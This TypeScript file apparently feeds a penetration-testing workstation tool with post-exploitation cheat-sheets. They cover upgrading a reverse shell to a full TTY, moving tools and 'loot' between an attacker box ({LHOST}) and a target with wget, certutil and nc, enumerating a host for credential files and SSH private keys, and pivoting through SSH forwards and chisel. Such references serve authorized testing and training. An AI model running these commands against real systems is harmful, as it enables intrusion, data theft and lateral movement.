import type { WorkstationItem } from "../types";

/**
 * Situational cheat-sheets: the things you reach for the moment you land a shell.
 */

const ttyUpgrade: WorkstationItem = {
  id: "tty-upgrade",
  name: "TTY Upgrade",
  category: "Cheat-sheets",
  summary: "Turn a dumb reverse shell into a fully interactive terminal.",
  kind: "snippets",
  snippets: [
    { id: "python", label: "1. Spawn PTY (python3)", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", explain: "Upgrades to a pseudo-terminal." },
    { id: "python2", label: "1. Spawn PTY (python)", command: "python -c 'import pty; pty.spawn(\"/bin/bash\")'" },
    { id: "script", label: "1. Spawn PTY (script)", command: "script -qc /bin/bash /dev/null", explain: "When python is unavailable." },
    { id: "bg", label: "2. Background shell", command: "export TERM=xterm", explain: "Then press Ctrl+Z to background it." },
    { id: "stty", label: "3. Raw mode (run locally)", command: "stty raw -echo; fg", explain: "Run in YOUR terminal after Ctrl+Z, then press Enter twice." },
    { id: "resize", label: "4. Fix size", command: "stty rows 38 columns 116", explain: "Match your terminal dimensions." },
  ],
};

const fileTransfer: WorkstationItem = {
  id: "file-transfer",
  name: "File Transfer",
  category: "Cheat-sheets",
  summary: "Move tools and loot between your box and the target.",
  kind: "snippets",
  snippets: [
    { id: "http-server", label: "Serve cwd (python3)", command: "python3 -m http.server 80", explain: "Host files from your box on port 80.", newTab: true },
    { id: "http-server-8000", label: "Serve cwd (port 8000)", command: "python3 -m http.server 8000", newTab: true },
    { id: "wget", label: "Download (wget)", command: "wget http://{LHOST}/file -O /tmp/file" },
    { id: "curl", label: "Download (curl)", command: "curl http://{LHOST}/file -o /tmp/file" },
    { id: "certutil", label: "Download (Windows certutil)", command: "certutil -urlcache -f http://{LHOST}/file.exe file.exe" },
    { id: "ps-download", label: "Download (PowerShell)", command: "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}/file.exe -OutFile file.exe\"" },
    { id: "nc-send", label: "Send with nc (receiver)", command: "nc -lvnp 4444 > incoming.file", newTab: true },
    { id: "nc-recv", label: "Send with nc (sender)", command: "nc {LHOST} 4444 < outgoing.file" },
    { id: "scp", label: "SCP", command: "scp file {USER}@{RHOST}:/tmp/file" },
    { id: "b64-enc", label: "Base64 encode (source)", command: "base64 -w0 file", explain: "Copy the output, then decode on the target." },
    { id: "b64-dec", label: "Base64 decode (target)", command: "echo <base64> | base64 -d > file" },
  ],
};

const enumeration: WorkstationItem = {
  id: "enumeration",
  name: "Host Enumeration",
  category: "Cheat-sheets",
  summary: "First-look enumeration once you have any foothold.",
  kind: "snippets",
  snippets: [
    { id: "os", label: "OS / kernel", command: "uname -a; cat /etc/os-release 2>/dev/null" },
    { id: "users", label: "Users with shells", command: "grep -vE 'nologin|false' /etc/passwd" },
    { id: "network", label: "Network config", command: "ip a; ip route; cat /etc/hosts" },
    { id: "listening", label: "Listening services", command: "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null" },
    { id: "arp", label: "Neighbours (ARP)", command: "ip neigh; arp -a 2>/dev/null" },
    { id: "mounts", label: "Mounts / fstab", command: "mount; cat /etc/fstab" },
    { id: "interesting", label: "Config files", command: "find / -name '*.conf' -o -name '*.config' 2>/dev/null | head -n 50" },
    { id: "keys", label: "SSH keys", command: "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null" },
  ],
};

const pivoting: WorkstationItem = {
  id: "pivoting",
  name: "Pivoting & Tunnels",
  category: "Cheat-sheets",
  summary: "Reach internal networks through a compromised host.",
  kind: "snippets",
  snippets: [
    { id: "ssh-local", label: "SSH local forward", command: "ssh -L 8080:127.0.0.1:80 {USER}@{RHOST}", explain: "Expose a target-internal port on your box." },
    { id: "ssh-dynamic", label: "SSH dynamic (SOCKS)", command: "ssh -D 1080 {USER}@{RHOST}", explain: "Then set proxychains to socks5 127.0.0.1 1080." },
    { id: "ssh-remote", label: "SSH remote forward", command: "ssh -R 8080:127.0.0.1:80 {USER}@{LHOST}" },
    { id: "chisel-server", label: "chisel server (your box)", command: "chisel server -p 8000 --reverse", newTab: true },
    { id: "chisel-client", label: "chisel client (target)", command: "chisel client {LHOST}:8000 R:socks" },
    { id: "proxychains", label: "Run via proxychains", command: "proxychains -q nmap -sT -Pn {RHOST}" },
  ],
};

export const CHEATSHEETS: WorkstationItem[] = [ttyUpgrade, fileTransfer, enumeration, pivoting];
